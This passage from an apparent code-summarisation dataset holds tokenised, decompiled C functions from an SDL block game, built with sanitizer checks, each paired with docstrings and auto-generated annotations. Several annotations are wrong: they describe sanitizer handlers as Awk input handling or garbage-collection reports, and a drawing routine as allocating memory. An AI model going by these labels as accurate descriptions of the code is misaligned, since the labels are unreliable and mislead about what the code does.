            "g",
            "-",
            ">",
            "ls",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "16",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ls",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ls",
            ")",
            ";",
            "}",
            "v8",
            "=",
            "g",
            "-",
            ">",
            "ls",
            ";",
            "v9",
            "=",
            "SDL_GetTicks",
            "(",
            ")",
            ";",
            "v10",
            "=",
            "v9",
            ";",
            "if",
            "(",
            "!",
            "v8",
            ")",
            "__ubsan_handle_divrem_overflow",
            "(",
            "&",
            "off_232A60",
            ",",
            "v9",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "r",
            "=",
            "v10",
            "%",
            "v8",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_232FC0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ls",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "16",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ls",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ls",
            ")",
            ";",
            "}",
            "v11",
            "=",
            "g",
            "-",
            ">",
            "ls",
            ";",
            "v12",
            "=",
            "r",
            "+",
            "1",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "r",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_233120",
            ",",
            "r",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v11",
            "=",
            "=",
            "0",
            "|",
            "|",
            "r",
            "=",
            "=",
            "0x7FFFFFFF",
            "&",
            "&",
            "v11",
            "=",
            "=",
            "-",
            "1",
            ")",
            "__ubsan_handle_divrem_overflow",
            "(",
            "&",
            "off_232AA0",
            ",",
            "v12",
            ",",
            "v11",
            ")",
            ";",
            "v13",
            "=",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "(",
            "*",
            "s",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "(",
            "v12",
            "%",
            "v11",
            ")",
            "]",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_233020",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "v14",
            "=",
            "g",
            "-",
            ">",
            "ms",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_233080",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "copyMatrix",
            "(",
            "g",
            "-",
            ">",
            "ns",
            ",",
            "v14",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "g",
            "-",
            ">",
            "next",
            ",",
            "v13",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"san_handle\" function appears to be a part of the code related to handling various error types and violations with the Undefined Behavior Sanitizer (UBSan) in C and C++ code.",
            "The \"mismatch\" function is likely used to handle and report any mismatches or errors, such as bracket mismatches, endianness mismatches, or version mismatches, within the context of the program or system.",
            "The \"report\" function is likely used to generate and output a report of statistics and debugging information related to the memory allocation and garbage collection in the given programming context.",
            "The \"handle\" function appears to be creating a context for managing input devices, handling error codes, and dealing with utf-8 string operations in the context of Awk programming language."
        ],
        "longer_label": "The code appears to handle errors and violations related to memory access and type mismatches, likely using the Undefined Behavior Sanitizer (UBSan) to report and handle such issues."
    },
    {
        "id": 227,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "draw",
            "a",
            "grid",
            "of",
            "shapes",
            "on",
            "an",
            "SDL",
            "window",
            "with",
            "specified",
            "dimensions",
            "and",
            "colors",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "x",
            ",",
            "int",
            "y",
            ",",
            "cell_0",
            "(",
            "*",
            "grid",
            ")",
            "[",
            "4",
            "]",
            ",",
            "SDL_Renderer_0",
            "*",
            "rend",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "bool",
            "v8",
            ";",
            "int",
            "v9",
            ";",
            "int",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "int",
            "v14",
            ";",
            "int",
            "v15",
            ";",
            "int",
            "v16",
            ";",
            "cell_0",
            "*",
            "v17",
            ";",
            "unsigned",
            "__int64",
            "v18",
            ";",
            "bool",
            "v19",
            ";",
            "cell_0",
            "*",
            "v20",
            ";",
            "char",
            "v21",
            ";",
            "cell_0",
            "*",
            "v22",
            ";",
            "char",
            "v23",
            ";",
            "cell_0",
            "*",
            "v24",
            ";",
            "char",
            "v25",
            ";",
            "unsigned",
            "int",
            "g",
            ";",
            "unsigned",
            "int",
            "b",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "char",
            "v33",
            "[",
            "88",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v34",
            ";",
            "v4",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v33",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v5",
            "=",
            "__asan_stack_malloc_0",
            "(",
            "64L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v5",
            ")",
            "v4",
            "=",
            "v5",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v4",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 16 1 r \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "16",
            ")",
            "=",
            "drawShape",
            ";",
            "v6",
            "=",
            "v4",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v6",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v6",
            "+",
            "2147450884",
            ")",
            "=",
            "-",
            "219021312",
            ";",
            "v34",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0xAu",
            ",",
            "0x2Eu",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_2334E0",
            ",",
            "46L",
            "L",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "v7",
            "=",
            "x",
            "+",
            "j",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "x",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_233560",
            ",",
            "j",
            ",",
            "x",
            ")",
            ";",
            "v8",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "46L",
            "L",
            "*",
            "v7",
            ")",
            ">",
            ">",
            "32",
            "!",
            "=",
            "0",
            ";",
            "v9",
            "=",
            "46",
            "*",
            "v7",
            ";",
            "if",
            "(",
            "v8",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_2335A0",
            ",",
            "46L",
            "L",
            ",",
            "x",
            "+",
            "j",
            ")",
            ";",
            "v10",
            "=",
            "v9",
            ";",
            "v8",
            "=",
            "__OFADD__",
            "(",
            "v9",
            ",",
            "141",
            ")",
            ";",
            "v11",
            "=",
            "v9",
            "+",
            "141",
            ";",
            "if",
            "(",
            "v8",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2335E0",
            ",",
            "141L",
            "L",
            ",",
            "v10",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "32",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "32",
            ")",
            "=",
            "v11",
            ";",
            "v12",
            "=",
            "y",
            "+",
            "i",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "y",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_233620",
            ",",
            "i",
            ",",
            "y",
            ")",
            ";",
            "v8",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "46L",
            "L",
            "*",
            "v12",
            ")",
            ">",
            ">",
            "32",
            "!",
            "=",
            "0",
            ";",
            "v13",
            "=",
            "46",
            "*",
            "v12",
            ";",
            "if",
            "(",
            "v8",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_233660",
            ",",
            "46L",
            "L",
            ",",
            "y",
            "+",
            "i",
            ")",
            ";",
            "v14",
            "=",
            "v13",
            ";",
            "v8",
            "=",
            "__OFADD__",
            "(",
            "10",
            ",",
            "v13",
            ")",
            ";",
            "v15",
            "=",
            "v13",
            "+",
            "10",
            ";",
            "if",
            "(",
            "v8",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2336A0",
            ",",
            "v14",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "v16",
            "=",
            "v15",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "36",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "36",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "v16",
            "=",
            "v4",
            "+",
            "36",
            ";",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "36",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "36",
            ")",
            "=",
            "v16",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "40",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "40",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "40",
            ")",
            "=",
            "46",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "44",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v4",
            "+",
            "44",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "v4",
            "+",
            "44",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "44",
            ")",
            "=",
            "46",
            ";",
            "v17",
            "=",
            "&",
            "(",
            "*",
            "grid",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_2331A0",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v17",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v17",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2331E0",
            ",",
            "v17",
            ")",
            ";",
            "v18",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v17",
            "[",
            "j",
            "]",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v18",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v17",
            "+",
            "16",
            "*",
            "j",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v18",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load1",
            "(",
            "&",
            "v17",
            "[",
            "j",
            "]",
            ")",
            ";",
            "}",
            "v19",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v18",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v18",
            ">",
            "1u",
            ")",
            "__ubsan_handle_load_invalid_value",
            "(",
            "&",
            "off_236440",
            ",",
            "v19",
            ")",
            ";",
            "if",
            "(",
            "v19",
            ")",
            "{",
            "v20",
            "=",
            "&",
            "(",
            "*",
            "grid",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_233240",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v20",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v20",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_233280",
            ",",
            "v20",
            ")",
            ";",
            "v21",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v20",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v21",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "v20",
            "+",
            "16",
            "*",
            "j",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v21",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "v20",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ")",
            ";",
            "b",
            "=",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v20",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "b",
            ";",
            "v22",
            "=",
            "&",
            "(",
            "*",
            "grid",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_2332E0",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v22",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v22",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_233320",
            ",",
            "v22",
            ")",
            ";",
            "v23",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v22",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v23",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "v22",
            "+",
            "16",
            "*",
            "j",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v23",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "v22",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ")",
            ";",
            "g",
            "=",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v22",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "g",
            ";",
            "v24",
            "=",
            "&",
            "(",
            "*",
            "grid",
            ")",
            "[",
            "4",
            "*",
            "(",
            "__int64",
            ")",
            "i",
            "]",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_233380",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v24",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v24",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2333C0",
            ",",
            "v24",
            ")",
            ";",
            "v25",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "v24",
            "[",
            "j",
            "]",
            ".",
            "c",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "v25",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "v24",
            "+",
            "16",
            "*",
            "j",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "v25",
            ")",
            "__asan_report_load4",
            "(",
            "&",
            "v24",
            "[",
            "j",
            "]",
            ".",
            "c",
            ")",
            ";",
            "SDL_SetRenderDrawColor",
            "(",
            "rend",
            ",",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v24",
            "[",
            "j",
            "]",
            ".",
            "c",
            ".",
            "r",
            ",",
            "g",
            ",",
            "b",
            ",",
            "255L",
            "L",
            ")",
            ";",
            "SDL_RenderFillRect",
            "(",
            "rend",
            ",",
            "v4",
            "+",
            "32",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_2336E0",
            ",",
            "j",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "i",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_233720",
            ",",
            "i",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "}",
            "if",
            "(",
            "v33",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v4",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v4",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v4",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v4",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"malloc\" function is used to dynamically allocate memory in C programming, allowing the programmer to request a specific amount of memory at runtime."
        ],
        "longer_label": "The code is a function that dynamically allocates memory and draws a shape on an SDL renderer using the allocated memory."
    },
    {
        "id": 228,
        "docstring_tokens": [
            "This",
            "code",
            "draws",
            "the",
            "next",
            "game",
            "board",
            "state",
            "on",
            "the",
            "screen",
            "using",
            "SDL",
            "graphics",
            "with",
            "a",
            "white",
            "or",
            "colored",
            "square",
            "grid",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ",",
            "SDL_Renderer_0",
            "*",
            "rend",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "bool",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "int",
            "v9",
            ";",
            "int",
            "v10",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "bool",
            "v12",
            ";",
            "char",
            "v13",
            ";",
            "char",
            "v14",
            ";",
            "char",
            "v15",
            ";",
            "unsigned",
            "int",
            "v16",
            ";",
            "unsigned",
            "int",
            "b",
            ";",
            "int",
            "j",
            ";",
            "int",
            "i",
            ";",
            "char",
            "v21",
            "[",
            "88",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v22",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v21",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v3",
            "=",
            "__asan_stack_malloc_0",
            "(",
            "64L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "v2",
            "=",
            "v3",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "8",
            ")",
            "=",
            "\"1 32 16 1 r \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "16",
            ")",
            "=",
            "DrawNext",
            ";",
            "v4",
            "=",
            "v2",
            ">",
            ">",
            "3",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "2147450880",
            ")",
            "=",
            "-",
            "235802127",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "2147450884",
            ")",
            "=",
            "-",
            "219021312",
            ";",
            "v22",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0xAu",
            ",",
            "0x17u",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_233CE0",
            ",",
            "23L",
            "L",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "303",
            ",",
            "454",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_233D60",
            ",",
            "454L",
            "L",
            ",",
            "303L",
            "L",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "=",
            "3",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "v5",
            "=",
            "23",
            "*",
            "j",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0x17u",
            ",",
            "j",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_233DA0",
            ",",
            "j",
            ",",
            "23L",
            "L",
            ")",
            ";",
            "v6",
            "=",
            "__OFADD__",
            "(",
            "v5",
            ",",
            "757",
            ")",
            ";",
            "v7",
            "=",
            "v5",
            "+",
            "757",
            ";",
            "if",
            "(",
            "v6",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_233DE0",
            ",",
            "757L",
            "L",
            ",",
            "23",
            "*",
            "j",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
